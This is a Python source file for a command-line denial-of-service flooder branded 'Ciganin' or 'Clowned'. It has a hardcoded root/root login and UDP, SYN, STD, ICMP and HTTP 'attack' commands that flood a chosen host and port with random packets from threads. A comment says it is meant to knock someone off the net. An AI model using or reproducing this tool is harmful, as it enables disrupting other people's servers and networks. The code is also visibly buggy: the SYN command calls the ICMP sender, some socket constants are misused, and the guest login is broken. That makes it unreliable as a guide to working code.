#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("\x1b]2;Ciganin Made By F3X\x07")
def modifications():
	print ("Contact K The Script Is Currently Under Maitnance.")
	on_enter = input("Press Enter To Leave.")
	exit()
#column:65
methods = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mAttack Methods\033[91m                   ║               
║══════════════════════════════════════════════════════║
║                  MAX PACKETS IS 65000                ║
║ \033[00mUDP  (HOST) (PORT) (TIME) (PACKETS) \033[91m|\033[00m UDP ATTACK\033[91m     ║
║ \033[00mSYN  (HOST) (PORT) (TIME) (PACKETS) \033[91m|\033[00m SYN ATTACK\033[91m     ║
║ \033[00mSTD  (HOST) (PORT) (TIME) (PACKETS) \033[91m|\033[00m STD ATTACK\033[91m     ║
║ \033[00mICMP (HOST) (PORT) (TIME) (PACKETS) \033[91m|\033[00m ICMP ATTACK\033[91m    ║
║ \033[00mHTTP (HOST) (PORT) (TIME) (PACKETS) \033[91m|\033[00m HTTP ATTACK\033[91m    ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

info = """
╔══════════════════════════════════════════════════════╗
║                  \033[00mClowned information\033[91m                               
║══════════════════════════════════════════════════════║
║          Направено от рекси	
		   за да спираме на пафката нета
╚══════════════════════════════════════════════════════╝\033[00m
"""

help = """\033[91m
╔══════════════════════════════════════════════════════╗
║                    \033[00mHelp display\033[91m                      ║
║══════════════════════════════════════════════════════║
║ \033[00mMethods \033[91m|\033[00m циганин Attack Methods\033[91m                     ║
║ \033[00mTools   \033[91m|\033[00m циганин Tools\033[91m                              ║
║ \033[00mInfo    \033[91m|\033[00m циганин Info\033[91m                       ║
║ \033[00mClear   \033[91m|\033[00m Clear Screen\033[91m                               ║
║ \033[00mExit    \033[91m|\033[00m Exit циганин\033[91m                               ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

tools = """\033[91m
╔══════════════════════════════════════════════════════╗
║                        \033[00mTools\033[91m                         ║
║══════════════════════════════════════════════════════║
║ \033[00mStop Attacks            \033[91m|\033[00m Stops All Attacks\033[91m          ║
║ \033[00mAttacks                 \033[91m|\033[00m Shows Running Attacks\033[91m      ║
║ \033[00mPing (HOST) (PORT)      \033[91m|\033[00m Pings A Host\033[91m               ║ 
║ \033[00mResolve (HOST)          \033[91m|\033[00m Grabes A Domain IP\033[91m         ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

updatenotes = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mUpdate notes\033[91m                     ║
║══════════════════════════════════════════════════════║
║ \033[00m[*] Username And Password Changed To "root".\033[91m         ║
║ \033[00m[*] Added STD Method.\033[91m                                ║
║ \033[00m[*] Added HTTP Method.\033[91m                               ║
║ \033[00m[*] Timeout Bug Fixed.\033[91m                               ║
║ \033[00m[*] Took Out Some Tools.\033[91m                             ║
║ \033[00m[*] To Be A Guest Type "guest" For User And Pass.\033[91m    ║
║ \033[00m[*] All Tools Fixed And Working.\033[91m                     ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

banner = """               


 ▄████▄   ██▓  ▄████  ▄▄▄       ███▄    █  ██▓ ███▄    █ 
▒██▀ ▀█  ▓██▒ ██▒ ▀█▒▒████▄     ██ ▀█   █ ▓██▒ ██ ▀█   █ 
▒▓█    ▄ ▒██▒▒██░▄▄▄░▒██  ▀█▄  ▓██  ▀█ ██▒▒██▒▓██  ▀█ ██▒
▒▓▓▄ ▄██▒░██░░▓█  ██▓░██▄▄▄▄██ ▓██▒  ▐▌██▒░██░▓██▒  ▐▌██▒
▒ ▓███▀ ░░██░░▒▓███▀▒ ▓█   ▓██▒▒██░   ▓██░░██░▒██░   ▓██░
░ ░▒ ▒  ░░▓   ░▒   ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░▓  ░ ▒░   ▒ ▒ 
  ░  ▒    ▒ ░  ░   ░   ▒   ▒▒ ░░ ░░   ░ ▒░ ▒ ░░ ░░   ░ ▒░
░         ▒ ░░ ░   ░   ░   ▒      ░   ░ ░  ▒ ░   ░   ░ ░ 
░ ░       ░        ░       ░  ░         ░  ░           ░ 
░                                                        


                                                                                                
"""

cookie = open(".k_Cookie","w+")

fsubs = 0
tpings = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True
std = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def stdsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http
	global std

	while True:
		sys.stdout.write("\x1b]2;Clowned Made By K\x07")
		sin = input("\033[1;00m[\033[91mk\033[1;00m]# ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "help":
			print (help)
			main()
		elif sinput == "exit":
			exit()
		elif sinput == "methods":
			print (methods)
			main()
		elif sinput == "tools":
			print (tools)
			main()
		elif sinput == "updates":
			print (updatenotes)
			main()
		elif sinput == "info":
			print (info)
			main()
		elif sinput == "attacks":
			print ("\n[\033[91mk\033[00m] Total Attacks: {}\n".format (aid))
			main()
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mk\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
			main()
		elif sinput == "ping":
			tpings += 1
			try:
				sinput, host, port = sin.split(" ")
				print ("[\033[91mk\033[00m] Starting Ping On Host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("[\033[91mk\033[00m] Host Un-Resolvable.")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;S H R E D [()ms] C H A M Z\x07".format (stop))
						print ("k: {}:{} | Time: {}ms [\033[91mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;S H R E D |TIME OUT| C H A M Z\x07")
						print ("k: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[91mk\033[00m] The Command {} Requires An Argument.".format (sinput))
				main()
		elif sinput == "udp":
			if username == "guests":
				print ("[\033[91mk\033[00m] You Are Not Allowed To Use This Method.")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack Sent To: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mk\033[00m] The Command {} Requires An Argument.".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mk\033[00m] Host: {} Invalid".format (host))
					main()
		elif sinput == "http":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mk\033[00m] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mk\033[00m] Host: {} Invalid".format (host))
				main()
		elif sinput == "std":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mk\033[00m] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mk\033[00m] Host: {} Invalid".format (host))
				main()
		elif sinput == "icmp":
			if username == "guests":
				print ("[\033[91mk\033[00m] You Are Not Allowed To Use This Method.")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack Sent To: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mk\033[00m] The Command {} Requires An Argument.".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mk\033[00m] Host: {} Invalid".format (host))
					main()
		elif sinput == "syn":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mk\033[00m] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mk\033[00m] Host: {} Invalid".format (host))
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[91mk\033[00m] No UDP Processes Running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all icmp attacks")
				icmp = False
				while not icmp:
					print ("[\033[91mk\033[00m] No ICMP Processes Running.")
					udp = True
					main()
		else:
			print ("[\033[91mk\033[00m] {} Is Not A Command.".format(sinput))
			main()



try:
	users = ["root"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[*] Username  ")
	if username in users:
		user = username
	else:
		print ("[*] Incorrect, Exiting.")
		exit()
except KeyboardInterrupt:
	print ("\nCtrl-C Has Been Pressed.")
	exit()
try:
	passwords = ["root"]
	password = getpass.getpass ("[*] Password  ")
	if user == "root":
		if password == passwords[0]:
			print ("[*] Login Correct.")
			cookie.write("DIE")
			time.sleep(3)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mk\033[00m] Ctrl-C Was Pressed.")
				main()
		else:
			print ("[*] Incorrect, Exiting.")
			exit()
	if user == "guest":
		if password == passwords[1]:
			print ("[*] Login Correct.")
			print ("[*] Certain Methods Will Not Be Available To You.")
			print ("[*] Type help To See Commands.")
			time.sleep(5)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mk\033[00m] Ctrl-C Was Pressed.")
				main()
		else:
			print ("[*] Incorrect, Exiting.")
			exit()
except KeyboardInterrupt:
	exit()